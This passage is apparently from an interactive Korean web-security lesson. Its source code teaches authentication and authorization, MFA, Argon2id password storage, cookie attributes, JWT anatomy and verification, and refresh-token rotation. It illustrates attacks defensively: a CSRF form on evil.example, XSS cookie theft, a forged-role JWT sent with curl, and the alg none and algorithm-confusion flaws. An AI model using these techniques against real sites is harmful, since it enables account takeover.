        if (st.tok !== 'ok') { stop = 0; code = '401 Unauthorized'; why = { none: '토큰이 없다 — “누구세요?” 로그인부터', exp: 'token expired — 다시 로그인(또는 Refresh)하면 해결될 수 있다', bad: 'invalid token — 서명 불일치. 위조 또는 서버 키가 다름' }[st.tok]; }
        else if (st.role === 'student' && st.sid !== '2026001') { stop = 1; code = '403 Forbidden'; why = '신원은 확인됐지만 <b>남의 자원</b> — 소유권 검사에서 거부 (존재 자체를 숨기려면 404). 다시 로그인해도 같다.'; }
        else if (st.role === 'student' && st.m === 'PATCH') { stop = 1; code = '403 Forbidden'; why = '학생 role에는 성적 <b>수정</b> 권한이 없다 (RBAC).'; }
        else why = st.role === 'professor' ? '교수 role은 모든 학생 성적 조회 · 입력 가능 (RBAC)' : '본인 성적 조회 — 소유권 일치';
        const box = ['인증 (AuthN)<br><small>토큰 검증 — 누구?</small>', '인가 (AuthZ)<br><small>role · 소유권 — 해도 되나?</small>', 'Handler<br><small>실행</small>'];
        return `<p class="mono" style="margin:0 0 8px">${path}</p><div class="hflow"><div class="fl-step"><span>Client</span></div>${box.map((b, i) => `<span class="fl-arr">→</span><div class="fl-step" style="${stop === i ? 'outline:2px solid var(--bad)' : stop >= 0 && i > stop ? 'opacity:.35' : 'outline:2px solid var(--ok)'}"><span>${b}</span></div>`).join('')}</div>` +
          `<div class="verdict ${code.startsWith('200') ? 'ok' : 'bad'}">${code}</div><p style="margin:0">${why}</p>`; } } },
    H.warn('헷갈리는 이름: HTTP 401의 이름은 “Unauthorized”지만 실제 의미는 <b>“Unauthenticated(인증 안 됨)”</b>이다. 헤더 이름 <code>Authorization</code>도 사실은 <b>인증</b> 정보를 담는다.'),
    { h3: '호텔로 이해하기 (S17)' },
    T(['호텔', '웹', '응답'], [['프런트에서 신분증 · 예약 확인', 'POST /login (Authentication)', '—'], ['카드키 발급 (1205호 · 3박)', 'Session / JWT 발급 {sub, role, exp}', '—'], ['카드키 없이 12층 버튼', '토큰 없이 GET /v1/grades', '<b>401</b> — 로그인부터'], ['내 카드키로 1206호 문을 엶', '학생 토큰으로 /students/1002/grades', '<b>403</b> (또는 404로 존재 숨김)'], ['체크아웃 후 카드키 무효', '만료(exp) · 로그아웃 · 폐기', '401']]),
    H.key('프런트는 한 번만, 카드키 검사는 문마다 → <b>인증은 로그인 때 한 번, 인가는 요청(endpoint)마다 매번</b>.'),
  ] },

{ id: 'w6.mfa', title: '인증 요소와 MFA', slides: 'S18',
  blocks: [
    H.cards([['지식 요소 — Something you <b>know</b>', '비밀번호 · PIN · 보안 질문<br>피싱 · 유출 · 재사용에 취약', ''], ['소유 요소 — Something you <b>have</b>', 'OTP 앱(TOTP) · 스마트폰 푸시 · 보안키(FIDO2)<br>기기를 함께 훔쳐야 한다', 'L3'], ['생체 요소 — Something you <b>are</b>', '지문 · 얼굴 · 홍채<br>바꿀 수 없음 → 기기 안에서만 확인', 'L7']]),
    { lab: { title: '이 조합은 MFA인가?', init: { a: 'pw', b: 'q' },
      ctl: [{ k: 'a', type: 'select', label: '요소 1', opts: [['pw', '비밀번호'], ['pin', 'PIN'], ['q', '보안 질문'], ['otp', 'OTP 앱 (TOTP)'], ['sms', 'SMS 코드'], ['key', '보안키 (FIDO2)'], ['bio', '지문']] }, { k: 'b', type: 'select', label: '요소 2', opts: [['pw', '비밀번호'], ['pin', 'PIN'], ['q', '보안 질문'], ['otp', 'OTP 앱 (TOTP)'], ['sms', 'SMS 코드'], ['key', '보안키 (FIDO2)'], ['bio', '지문']] }],
      out: st => { const K = { pw: 'know', pin: 'know', q: 'know', otp: 'have', sms: 'have', key: 'have', bio: 'are' }, N = { know: '지식', have: '소유', are: '생체' };
        const ka = K[st.a], kb = K[st.b]; if (st.a === st.b) return '<div class="verdict bad">같은 요소 두 번 — 1요소</div>';
        if (ka === kb) return `<div class="verdict bad">✕ MFA가 아니다</div><p style="margin:0">둘 다 <b>${N[ka]}</b> 요소다. 비밀번호 + 보안 질문은 “두 가지를 확인”해도 같은 종류라 피싱 한 번에 둘 다 털린다.</p>`;
        const weak = st.a === 'sms' || st.b === 'sms';
        return `<div class="verdict ${weak ? '' : 'ok'}">${weak ? '△ 약한 2FA' : '○ 2FA (MFA)'}</div><p style="margin:0">${N[ka]} + ${N[kb]} — 서로 다른 종류.${weak ? ' 다만 SMS는 유심 복제 · 가로채기 위험이 있다.' : ''} 강의: 요소 2개만 조합한 것을 2FA라 부른다.</p>`; } } },
    T(['조합', 'MFA인가?', '이유'], [['비밀번호 + 보안 질문', '<b class="cbad">✕ 아니다</b>', '둘 다 “지식” 요소'], ['비밀번호 + OTP 앱', '○ 2FA', '지식 + 소유'], ['비밀번호 + SMS 코드', '△ 약한 2FA', '유심 복제 · 가로채기 위험'], ['Passkey (FIDO2)', '○ 피싱 저항', '기기 소유 + 생체/PIN']]),
    H.key('<b>TOTP</b> — 가입 때 QR코드로 서버와 앱이 같은 비밀값을 나눠 가진다. 이후 양쪽이 “비밀값 + 현재 시각(30초 단위)”을 해시해 6자리를 각자 계산 → 같으면 통과. 그래서 네트워크 없이도 앱에서 코드가 생긴다.'),
    H.note('Passkey는 비밀번호 대신 기기의 개인키로 서명한다 — 서버에는 공개키만 저장되므로 서버가 털려도 훔칠 비밀번호가 없다.'),
  ] },

{ id: 'w6.pw', title: '비밀번호 저장 — 서버도 알 수 없어야 한다', slides: 'S19–S20',
  blocks: [
    `<p><b>원칙</b>: 서버도 사용자의 비밀번호를 “알 수 없어야” 한다. 저장하는 것은 <b>비교만 가능한 값</b>이다.</p>`,
    { lab: { title: '저장 방식별로 DB가 유출되면?', init: { m: 'sha' },
      ctl: [{ k: 'm', type: 'select', label: '저장 방식', opts: PW.map(r => [r[0], r[1]]) }],
      out: st => { const r = PW.find(x => x[0] === st.m), i = PW.indexOf(r);
        return `<div class="rmm">${PW.map((p, k) => `<div class="rmm-row ${k === i ? 'goal' : ''}" style="${k === i ? '' : 'opacity:.5'}"><div class="rmm-n">${p[1]}</div><div><code>${esc(p[2])}</code><div class="cm" style="font-size:14px">${p[3]}</div></div></div>`).join('')}</div>` +
          T(['사용자', '비밀번호', '저장된 값'], [['kim', 'inu1234', st.m === 'plain' ? 'inu1234' : st.m === 'aes' ? 'U2FsdGVkX1+a3…' : st.m === 'sha' ? '9b1f3c…e42a' : st.m === 'salt' ? 'Qx9$3e7a…' : '$argon2id$…$Qx9f…$3e7a…'], ['lee', 'inu1234', st.m === 'plain' ? 'inu1234' : st.m === 'aes' ? 'U2FsdGVkX1+a3…' : st.m === 'sha' ? '<b class="cbad">9b1f3c…e42a ← kim과 같다!</b>' : st.m === 'salt' ? 'Lm2$c81d… ← 다르다' : '$argon2id$…$Lm2p…$c81d… ← 다르다']], { mono: [2] }); } } },
    H.pre(`# pwdlib (FastAPI 공식 튜토리얼 방식)  pip install "pwdlib[argon2]"
from pwdlib import PasswordHash
ph = PasswordHash.recommended()        # Argon2id
h = ph.hash("inu1234")                  # 가입 시 저장
ph.verify("inu1234", h)                 # 로그인 시 비교 → True`),
    H.key('왜 “느린” 해시인가? 정상 로그인은 0.1초 걸려도 불편하지 않다. 하지만 유출된 해시로 10억 개를 대입하는 공격자에게는 <b>0.1초 × 10억 = 3년</b>이 된다.'),
    { h3: '“믹서기”로 이해하기 (S20)' },
    T(['비유', '실제', '포인트'], [['① 믹서기 — 딸기+바나나 → 분홍 주스', '해시', '주스로 과일을 되돌릴 수 없다(단방향). 로그인 때 다시 갈아서 색만 비교'], ['② 공격자가 미리 만든 주스 색상표', '레인보우 테이블', '123456 · password · qwerty… 유출된 색을 표에서 찾으면 바로 과일'], ['③ 사람마다 다른 무작위 재료', 'Salt', '같은 비밀번호라도 주스 색이 다름 → 색상표가 쓸모없어짐'], ['④ 한 번 갈 때 오래 걸리는 믹서기', 'Argon2id (느린 해시)', '시간과 메모리를 많이 써서 대량 시도를 비싸게']]),
    H.warn('Salt는 <b>비밀이 아니다</b>. 해시 문자열 안에 함께 저장된다(<code>$argon2id$…$salt$hash</code>). 따로 숨겨 보관할 필요가 없다 — 시험 단골 함정.'),
  ] },

{ id: 'w6.login', title: '로그인 한 번의 전체 흐름', slides: 'S21',
  blocks: [
    { trace: { mode: 'ladder', title: 'TLS 위에서 비밀번호를 보내고, 해시로 비교한 뒤 출입증 발급', side: 120, rowH: 56,
      lanes: [{ id: 'b', label: 'Browser' }, { id: 'a', label: 'API Server' }, { id: 'd', label: 'User DB' }],
      events: [
        { from: 'b', to: 'a', label: '① POST /login (HTTPS)', color: 'l7', pkt: [req('POST /login', [['Body', '{"id":"2026001","pw":"inu1234"} — TLS로 암호화됨']])], say: '비밀번호는 <b>로그인 한 번만</b> 네트워크를 지난다. 반드시 HTTPS.' },
        { from: 'a', to: 'd', label: '② SELECT hash, role', color: 'l4', say: '<code>SELECT hash, role FROM users WHERE id = ?</code> — 파라미터 바인딩 (6.26).' },
        { from: 'd', to: 'a', label: '③ $argon2id$…', color: 'l4', say: '저장된 것은 비밀번호가 아니라 해시. 서버는 <code>verify(입력, 저장된 해시)</code>로 비교한다.' },
        { from: 'a', to: 'b', label: '④ 성공: Set-Cookie / token', color: 'ok', pkt: [res('200 OK', [['Set-Cookie', 'sid=a91f…; HttpOnly; Secure; SameSite=Lax'], ['또는 Body', '{"access_token":"eyJ…","token_type":"bearer"}']])], say: '성공하면 <b>새</b> 세션/토큰 발급 (기존 값 재사용 ✕ — Session Fixation 방지). 실패면 <b>401</b> — 메시지는 모호하게.' },
        { from: 'b', to: 'a', label: '⑤ 이후: Cookie / Bearer만', color: 'l7', pkt: [req('GET /v1/grades', [['Cookie', 'sid=a91f…'], ['또는 Authorization', 'Bearer eyJ…']])], say: '이후 모든 요청은 세션 ID 또는 토큰이 <b>비밀번호 역할을 대신</b>한다 → 이 값들도 비밀번호처럼 보호해야 한다.' },
      ] } },
    { h3: '로그인 API 체크리스트' },
    { mount: el => { const C = ['HTTPS에서만 받는다 (평문 HTTP 금지)', '비밀번호는 로그 · URL · 쿼리에 남기지 않는다', '“아이디 없음”과 “비번 틀림”을 구분해 알려 주지 않는다 (계정 존재 노출 = User Enumeration)', '실패 횟수 제한 · 지연 (Rate limit, 429)', '성공 시 새 세션/토큰 발급 (기존 값 재사용 ✕)', '응답에 해시 · role 내부 정보를 넣지 않는다'];
      const saved = LS.get('w6.login', []);
      const draw = () => { el.innerHTML = `<div class="lab"><div class="lab-head"><span class="tag">체크리스트</span>내 로그인 API는?</div><div class="lab-out">${C.map((c, i) => `<label class="ck"><input type="checkbox" data-i="${i}" ${saved.includes(i) ? 'checked' : ''}><span>${esc(c)}</span></label>`).join('')}</div></div>`;
        el.querySelectorAll('input').forEach(b => b.onchange = () => { const i = +b.dataset.i, k = saved.indexOf(i); if (b.checked && k < 0) saved.push(i); if (!b.checked && k >= 0) saved.splice(k, 1); LS.set('w6.login', saved); draw(); }); };
      draw(); } },
  ] },

{ id: 'w6.cookie', title: 'HTTP는 기억하지 못한다 → Cookie와 Session', slides: 'S22–S23',
  blocks: [
    { trace: { mode: 'ladder', title: '서버가 이름표를 주면, 브라우저가 매번 자동으로 붙인다', side: 110, rowH: 54,
      lanes: [{ id: 'b', label: 'Browser', sub: '쿠키 보관함' }, { id: 's', label: 'Server' }, { id: 'st', label: 'Session Store', sub: 'Redis · DB' }],
      tables: [{ id: 'ss', title: '세탁소 장부 = Session Store', cols: ['sid', 'user', 'role', '기한'], rows: [['7c2e…', '이교수 P0012', 'professor', '19:00']] }],
      events: [
        { from: 'b', to: 's', label: '① POST /login', color: 'l7', pkt: [req('POST /login', [['Body', 'id · pw']])], say: '로그인 요청.' },
        { from: 's', to: 'st', label: '세션 생성', color: 'l4', tables: { ss: [['7c2e…', '이교수 P0012', 'professor', '19:00'], ['a91f…', '김인천 2026001', 'student', '18:30']] }, say: '서버가 <b>의미 없는 무작위 번호</b>(128비트 이상)를 만들고, 장부에 “a91f… = 김인천”을 적는다.' },
        { from: 's', to: 'b', label: '② Set-Cookie: sid=a91f…', color: 'ok', pkt: [res('200 OK', [['Set-Cookie', 'sid=a91f…; HttpOnly; Secure']])], say: '브라우저에는 <b>번호표만</b> 준다. 번호표에는 아무 정보도 없다.' },
        { from: 'b', to: 's', label: '③ GET /v1/grades + Cookie', color: 'l7', pkt: [req('GET /v1/grades', [['Cookie', 'sid=a91f…  (자동 첨부)']])], say: '개발자가 아무것도 안 해도 브라우저가 <b>자동으로</b> 쿠키를 붙인다.' },
        { from: 's', to: 'st', label: 'sid 조회', color: 'l4', say: '요청마다 저장소를 한 번 조회해 사용자를 찾는다.' },
        { from: 's', to: 'b', label: '④ 200 [내 성적]', color: 'ok', pkt: [res('200 OK', [['Body', '{"NET301":"A+"}']])], say: '김인천의 성적.' },
        { from: 'b', to: 's', label: '⑤ POST /logout', color: 'l7', pkt: [req('POST /logout', [['Cookie', 'sid=a91f…']])], say: '로그아웃.' },
        { from: 's', to: 'st', label: '장부에서 삭제', color: 'bad', tables: { ss: [['7c2e…', '이교수 P0012', 'professor', '19:00']] }, say: '주인이 장부에서 번호를 지운다 → 그 번호표는 즉시 무효. <b>즉시 무효화가 쉽다</b>는 것이 세션의 장점.' },
      ] } },
    T(['쿠키 특징', '의미'], [['저장 위치', '브라우저 (사이트별 보관함)'], ['크기', '쿠키 하나 약 4KB 이하'], ['전송', '조건이 맞으면 매 요청에 <b>자동 첨부</b>'], ['주체', '서버가 만들고, 브라우저가 보관 · 전송'], ['JS 접근', 'HttpOnly면 document.cookie로 못 읽음']]),
    `<div class="pair"><div><h4 class="cok">자동 첨부 = 편리함</h4><p>개발자가 매번 헤더를 붙이지 않아도 로그인 상태가 유지된다.</p></div><div><h4 class="cbad">자동 첨부 = 위험</h4><p>다른 사이트가 만든 요청에도 쿠키가 붙을 수 있다 → <b>CSRF</b>의 원인 (6.25, SameSite로 해결).</p></div></div>`,
    T(['세탁소', 'Session 방식', '결과'], [['번호표만 보고 장부에서 찾는다', 'Cookie: sid → 저장소 조회 → 사용자 확인', '요청마다 저장소 조회 1번'], ['주인이 장부에서 번호를 지운다', '로그아웃 · 강제 종료 = 저장소에서 삭제', '<b>즉시 무효화가 쉽다</b> ✓'], ['지점이 여러 개면 장부를 공유해야', '서버가 여러 대면 Redis 등 공유 저장소 필요', '5주차 Stateless 문제']]),
    H.warn('Session ID는 추측할 수 없을 만큼 길고 무작위여야 하며(128비트 이상), <b>로그인 성공 시 새로 발급</b>해야 한다 — Session Fixation 방지.'),
  ] },

{ id: 'w6.attr', title: 'Cookie 보안 속성 — HttpOnly · Secure · SameSite', slides: 'S24',
  blocks: [
    H.pre('Set-Cookie: sid=a91f3c…; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600'),
    { lab: { title: '속성을 켜고 끄면 — 누가 읽고, 언제 전송되나', init: { ho: true, sec: true, ss: 'Lax', sc: 'xss' },
      ctl: [{ k: 'ho', type: 'toggle', label: 'HttpOnly' }, { k: 'sec', type: 'toggle', label: 'Secure' }, { k: 'ss', type: 'select', label: 'SameSite', opts: [['Strict', 'Strict'], ['Lax', 'Lax (기본값)'], ['None', 'None']] }, { k: 'sc', type: 'select', label: '상황', opts: [['xss', 'XSS 스크립트가 document.cookie 읽기'], ['http', '카페 Wi-Fi에서 http:// 로 접속'], ['csrf', 'evil.example의 숨은 form이 POST /transfer'], ['link', '다른 사이트의 링크를 클릭해 GET 이동'], ['same', '내 사이트에서 fetch POST']] }],
      out: st => { let ok, msg;
        if (st.ss === 'None' && !st.sec) return `<div class="verdict bad">쿠키 자체가 거부됨</div><p style="margin:0">SameSite=None은 <b>반드시 Secure와 함께</b> 써야 한다. 브라우저가 저장조차 하지 않는다 (DevTools Cookies 탭의 경고 아이콘).</p>`;
        if (st.sc === 'xss') { ok = st.ho; msg = st.ho ? 'HttpOnly → JS가 쿠키를 <b>읽을 수 없다</b>. (단, XSS 스크립트가 이 페이지에서 요청을 보내는 것까지 막지는 못한다 — 피해 축소일 뿐)' : 'document.cookie에 sid가 그대로 보인다 → 공격자 서버로 전송. 세션 쿠키에 HttpOnly는 필수.'; }
        else if (st.sc === 'http') { ok = st.sec; msg = st.sec ? 'Secure → HTTPS 연결에서만 전송. 평문 http에는 붙지 않는다.' : '평문 HTTP 요청에 쿠키가 실려 같은 Wi-Fi에서 도청된다.'; }
        else if (st.sc === 'csrf') { ok = st.ss !== 'None'; msg = ok ? `SameSite=${st.ss} → 다른 사이트에서 시작된 <b>POST</b>에는 쿠키를 붙이지 않는다 → 위조 요청이 로그인 안 된 요청이 된다.` : 'SameSite=None → 모든 요청에 쿠키가 붙어 송금이 처리된다 (CSRF 성공).'; }
        else if (st.sc === 'link') { ok = st.ss !== 'Strict'; msg = st.ss === 'Strict' ? '전송 안 됨 — 다른 사이트에서 들어오면 로그인이 풀린 것처럼 보인다 (Strict의 불편함). 은행·관리자 화면에 적합.' : 'Lax/None → 링크 클릭(최상위 GET 이동)에는 전송 → 로그인 상태 유지.'; return `<div class="verdict ${ok ? 'ok' : ''}">${ok ? '쿠키 전송됨' : '쿠키 안 보냄'}</div><p style="margin:0">${msg}</p>`; }
        else { ok = true; msg = '같은 사이트 요청 — SameSite와 무관하게 전송된다.'; return `<div class="verdict ok">쿠키 전송됨</div><p style="margin:0">${msg}</p>`; }
        return `<div class="verdict ${ok ? 'ok' : 'bad'}">${ok ? '막힘 ✓' : '뚫림 ✕'}</div><p style="margin:0">${msg}</p>`; } } },
    T(['속성', '의미', '막는 공격 · 문제', '권장'], [['<b>HttpOnly</b>', 'JavaScript(document.cookie)에서 읽을 수 없음', 'XSS로 세션 쿠키 탈취', '세션 쿠키는 필수'], ['<b>Secure</b>', 'HTTPS 연결에서만 전송', '평문 HTTP에서 도청', '항상 (localhost는 예외 허용)'], ['<b>SameSite=Strict</b>', '다른 사이트에서 시작된 요청엔 전송 안 함', 'CSRF (가장 강함)', '은행 · 관리자 화면'], ['<b>SameSite=Lax</b>', '다른 사이트의 링크 클릭(GET 이동)엔 전송, POST · fetch엔 안 함', '대부분의 CSRF', '일반 웹 (브라우저 기본값)'], ['<b>SameSite=None</b>', '모든 요청에 전송 — <b>반드시 Secure와 함께</b>', '보호 없음', '다른 도메인 임베드 시만'], ['Max-Age / Expires', '쿠키 수명. 없으면 브라우저 종료 시 삭제', '오래된 세션 악용', '짧게 + 재로그인'], ['Domain / Path', '어느 호스트 · 경로에 보낼지', '불필요한 하위 도메인 전송', 'Domain 생략 (현재 호스트만)']]),
    H.note('DevTools → Application → Cookies에서 각 쿠키의 HttpOnly · Secure · SameSite 열을 직접 확인할 수 있다. AI가 만든 Set-Cookie에 이 세 개가 없으면 의심부터 하자.'),
  ] },

{ id: 'w6.token', title: '토큰 기반 인증 — 세션은 기억, 토큰은 증명', slides: 'S25',
  blocks: [
    `<div class="pair"><div><h4>Session — 서버가 기억한다</h4>${lines(['브라우저: <code>Cookie: sid=a91f…</code> (의미 없는 번호)', '서버: 저장소에서 sid → {user: 2026001, role: student} 조회', '<span class="cok">장점</span>: 로그아웃 · 강제 종료가 즉시 반영', '<span class="cbad">단점</span>: 서버가 여러 대면 저장소 공유 필요 (Redis)'])}</div><div><h4>Token (JWT) — 토큰이 증명한다</h4>${lines(['클라이언트: <code>Authorization: Bearer eyJ…</code>', '토큰 안에 {sub, role, exp} + 서명', '서버: <b>서명만 검증하면 끝</b> — 저장소 조회 없음 (Stateless)', '<span class="cbad">단점</span>: 만료 전에는 강제로 무효화하기 어렵다'])}</div></div>`,
    { trace: { title: '서버를 늘리면?', sub: '왼쪽: 요청마다 Store 조회 · 오른쪽: 키만 있으면 어느 서버든 검증', rowH: 92,
      nodes: [{ id: 'c1', label: 'Client', sub: 'Cookie: sid', icon: 'browser', x: .04, y: 0 }, { id: 's1', label: 'Server ×N', icon: 'server', x: .26, y: 0 }, { id: 'st', label: 'Session Store', sub: '함께 늘려야', icon: 'db', x: .46, y: 0 }, { id: 'c2', label: 'Client', sub: 'Bearer JWT', icon: 'phone', x: .58, y: 1 }, { id: 's2', label: 'Server ×N', icon: 'server', x: .78, y: 1 }, { id: 'k', label: 'Secret / 공개키', icon: 'lock', x: .97, y: 1 }],
      links: [['c1', 's1'], ['s1', 'st'], ['c2', 's2'], ['s2', 'k', { dash: true }]], events: [] } },
    H.key('둘 중 무엇이 “더 안전”한 것이 아니다. 무엇을 서버에 두고(상태), 무엇을 클라이언트에 맡길지의 <b>설계 선택</b>이다 (6.20).'),
  ] },

{ id: 'w6.jwt', title: 'JWT 해부 — header.payload.signature', slides: 'S26–S27',
  blocks: [
    `<p>점(.) 두 개로 나뉜 세 덩어리. 앞의 둘은 <b>Base64URL로 “인코딩”만</b> 되어 있다.</p>`,
    { lab: { title: '직접 발급 · 디코딩 · 변조해 보기 (HS256, 브라우저에서 계산)', init: { sub: '2026001', role: 'student', secret: 'inu-demo-secret-please-use-32-bytes', tamper: false },
      ctl: [{ k: 'sub', type: 'text', label: 'sub', w: 110 }, { k: 'role', type: 'select', label: 'role', opts: [['student', 'student'], ['professor', 'professor']] }, { k: 'secret', type: 'text', label: '서버 SECRET', w: 230 }, { k: 'tamper', type: 'toggle', label: '공격자가 payload의 role을 professor로 바꿔치기' }],
      out: st => `<div data-jwt class="mono" style="font-size:13px;word-break:break-all">계산 중…</div><div data-dec></div><div data-ver></div>`,
      after: async (st, out) => { if (!canCrypto()) { out.querySelector('[data-jwt]').textContent = '(이 환경에서는 crypto.subtle을 쓸 수 없다)'; return; }
        const head = { alg: 'HS256', typ: 'JWT' }, pay = { sub: st.sub, role: st.role, exp: 1794380400 };
        const h = b64uStr(JSON.stringify(head)), p = b64uStr(JSON.stringify(pay)), sig = await hmac(st.secret, h + '.' + p);
        const p2 = st.tamper ? b64uStr(JSON.stringify({ ...pay, role: 'professor' })) : p, tok = `${h}.${p2}.${sig}`;
        const ok = (await hmac(st.secret, h + '.' + p2)) === sig; const el = out.querySelector('[data-jwt]'); if (!el) return;
        el.innerHTML = `<span style="color:var(--l3)">${h}</span>.<span style="color:var(--l7)${st.tamper ? ';background:var(--bad-s)' : ''}">${p2}</span>.<span style="color:var(--l4)">${sig}</span>`;
        out.querySelector('[data-dec]').innerHTML = `<div class="pair" style="margin-top:10px"><div><h4 style="color:var(--l3)">① Header — 어떻게 서명했나</h4>${H.pre(JSON.stringify(head, null, 2))}</div><div><h4 style="color:var(--l7)">② Payload — 누구이고 언제까지</h4>${H.pre(JSON.stringify(JSON.parse(unb64u(p2)), null, 2))}<p class="cm" style="font-size:13px;margin:0">↑ 서명 검증 없이 <b>누구나</b> Base64URL만 풀면 읽힌다</p></div></div><p style="margin:6px 0"><b style="color:var(--l4)">③ Signature</b> = HMAC-SHA256(base64url(header) + "." + base64url(payload), SECRET)</p>`;
        out.querySelector('[data-ver]').innerHTML = `<div class="verdict ${ok ? 'ok' : 'bad'}">서버 검증: ${ok ? '200 — 서명 일치' : '401 invalid token — 서명 불일치'}</div><p style="margin:0">${ok ? 'header.payload를 서버 키로 다시 서명한 값이 토큰의 signature와 같다.' : '공격자는 payload를 <b>읽고 고칠 수는</b> 있지만 SECRET이 없어 맞는 서명을 만들 수 없다 → “읽을 수 있지만 고칠 수 없다”.'}</p>`; } } },
    T(['Claim', '의미', 'Claim', '의미', 'Claim', '의미'], [['sub', 'Subject — 사용자 식별자', 'exp', 'Expiration — 만료 시각 (Unix 초)', 'iss', 'Issuer — 발급자'], ['aud', 'Audience — 받을 대상 API', 'iat', 'Issued At — 발급 시각', 'jti', 'JWT ID — 토큰 고유 번호']], { mono: [0, 2, 4] }),
    { h3: '“홀로그램 입장권”으로 이해하기 (S27)' },
    T(['입장권', 'JWT', '의미'], [['적힌 내용', 'Payload', '누구나 읽을 수 있다'], ['홀로그램', 'Signature', '발급처만 만들 수 있다'], ['입구 검표원', 'API 서버', '홀로그램만 확인, 명단 조회 ✕'], ['유효 시간', 'exp', '지나면 입장 거부 (401)'], ['“일반”을 “VIP”로 고쳐 씀', 'role 변조', '홀로그램 불일치 → 거부']]),
    H.cards([['읽을 수 있다', '입장권을 주운 사람도 이름 · 등급을 다 본다<br>→ 비밀번호 · 주민번호를 적으면 안 된다', ''], ['고칠 수 없다', '글자를 바꾸면 홀로그램이 맞지 않는다<br>→ 서버는 서명이 틀리면 무조건 거부', 'L3'], ['훔치면 쓸 수 있다', '입장권을 통째로 훔치면 그대로 입장 가능<br>→ 짧은 만료, HTTPS, 안전한 보관', 'L7']]),
  ] },

{ id: 'w6.verify', title: '서버의 JWT 검증 순서 — 디코딩이 아니라 검증', slides: 'S28–S29',
  blocks: [
    { fig: `<div class="hflow">${[['1', '형식', '점 3덩어리? Base64URL?'], ['2', '알고리즘 고정', 'algorithms=["HS256"] — 토큰의 alg를 믿지 않음'], ['3', '서명', '서버 키로 다시 서명 → 같은가?'], ['4', '시간', 'exp 지났나? nbf 전인가?'], ['5', '발급자 · 대상', 'iss · aud 확인'], ['6', '그다음 인가', 'role · scope · 소유권']].map(([n, a, b]) => `<div class="fl-step"><b>${n}</b><span><b>${a}</b><br><small>${b}</small></span></div>`).join('<span class="fl-arr">→</span>')}</div>` },
    T(['', 'HS256 (HMAC)', 'RS256 / ES256'], [['키', '비밀키 하나 공유', '개인키로 서명, 공개키로 검증'], ['서명', '발급 서버', '인증 서버만'], ['검증', '같은 비밀키 가진 서버', '<b>공개키만 있으면 누구나</b>'], ['적합', '단일 서비스', '여러 서비스 · OAuth/OIDC']]),
    H.warn('실제로 있었던 취약점<br>• <code>alg: none</code> 토큰을 그대로 통과시킨 라이브러리<br>• RS256 공개키를 HS256 비밀키로 착각해 검증 (<b>알고리즘 혼동</b>)<br>• 서명 검증 없이 decode만 하고 role을 신뢰'),
    H.pre(`jwt.decode(token, SECRET, algorithms=["HS256"],
           audience="grade-api", issuer="auth.inu.ac.kr")
# PyJWT의 jwt.decode()는 서명과 exp를 기본으로 검증한다.
# 하지만 options={"verify_signature": False}를 AI가 넣었다면 검증이 꺼진 것이다.`),
    { h3: 'JWT는 암호화가 아니다 (S29)' },
    H.pre(`$ echo 'eyJzdWIiOiIyMDI2MDAxIiwicm9sZSI6InN0dWRlbnQiLCJleHAiOjE3OTQzODA0MDB9' | base64 -d
{"sub":"2026001","role":"student","exp":1794380400}

# role을 professor로 바꾼 payload로 교체하면?
$ curl -H "Authorization: Bearer <변조된 토큰>" …/admin/grades
HTTP/1.1 401 Unauthorized   {"detail": "invalid token"}`),
    `<div class="pair"><div><h4 class="cok">Payload에 넣어도 되는 것</h4>${lines(['사용자 ID (sub)', '역할 · 권한 범위 (role, scope)', '만료 · 발급 정보 (exp, iat, iss)', '→ 노출돼도 큰 문제 없는 최소 정보'])}</div><div><h4 class="cbad">넣으면 안 되는 것</h4>${lines(['비밀번호 · 해시', '주민번호 · 전화번호 · 성적 같은 개인정보', 'API 비밀키 · 내부 시스템 정보'])}</div></div>`,
    H.key('<b>인코딩(Base64) ≠ 암호화(AES) ≠ 서명(HMAC/RSA)</b>. JWT의 기본형(JWS)은 “서명”만 한다. 내용까지 숨기려면 JWE를 쓰지만, 보통은 민감 정보를 넣지 않는 쪽을 택한다.'),
  ] },

{ id: 'w6.refresh', title: 'Access Token + Refresh Token', slides: 'S30–S31',
  blocks: [
    T(['', 'Access Token', 'Refresh Token'], [['용도', 'API 호출 (Bearer)', '새 Access Token 발급'], ['수명', '<b>짧게</b> — 5~15분', '<b>길게</b> — 수 일~수 주'], ['보내는 곳', '모든 API 요청', '/token/refresh 한 곳만'], ['저장', '메모리 (JS 변수)', 'HttpOnly · Secure 쿠키'], ['서버 기록', '보통 없음 (Stateless)', 'DB에 기록 → 폐기 가능']]),
    { trace: { mode: 'ladder', title: '만료 → 재발급 → Rotation', side: 120, rowH: 52,
      lanes: [{ id: 'c', label: 'Client' }, { id: 'a', label: 'API / Auth' }],
      tables: [{ id: 'rt', title: 'Refresh Token DB', cols: ['RT', '상태'], rows: [['RT₁', '유효']] }],
      events: [
        { from: 'c', to: 'a', label: 'GET /grades  Bearer AT₁', color: 'l7', pkt: [req('GET /grades', [['Authorization', 'Bearer AT₁']])], say: '짧은 수명의 Access Token으로 API 호출.' },
        { from: 'a', to: 'c', label: '200 [성적]', color: 'ok', say: '정상.' },
        { from: 'c', to: 'a', label: '(15분 후) Bearer AT₁', color: 'l7', say: '15분이 지났다.' },
        { from: 'a', to: 'c', label: '401 token expired', color: 'bad', pkt: [res('401 Unauthorized', [['WWW-Authenticate', 'Bearer error="invalid_token"'], ['Body', '{"detail":"token expired"}']])], say: '만료. 다시 로그인할 필요 없이 재발급권을 쓴다.' },
        { from: 'c', to: 'a', label: 'POST /token/refresh (쿠키: RT₁)', color: 'l7', pkt: [req('POST /token/refresh', [['Cookie', 'rt=RT₁; HttpOnly; Secure; SameSite=Strict']])], say: 'Refresh Token은 <b>이 한 곳에만</b> 보낸다.' },
        { from: 'a', to: 'c', label: '200 AT₂ + 새 RT₂', color: 'ok', tables: { rt: [['RT₁', '폐기'], ['RT₂', '유효']] }, pkt: [res('200 OK', [['Body', '{"access_token":"AT₂"}'], ['Set-Cookie', 'rt=RT₂; HttpOnly; Secure']])], say: '<b>Refresh Token Rotation</b>: 재발급할 때마다 RT도 새것으로 바꾸고 이전 것은 폐기. 폐기된 RT₁이 다시 오면 “도난”으로 보고 그 사용자의 모든 토큰을 끊는다.' },
        { from: 'c', to: 'a', label: 'GET /grades  Bearer AT₂', color: 'l7', say: '새 Access Token으로 계속.' },
        { from: 'a', to: 'c', label: '200', color: 'ok', say: '로그아웃 · 비밀번호 변경 시 RT를 DB에서 지우면 15분 안에 모든 접근이 끊긴다.' },
      ] } },
    { h3: '“놀이공원 이용권”으로 이해하기 (S31)' },
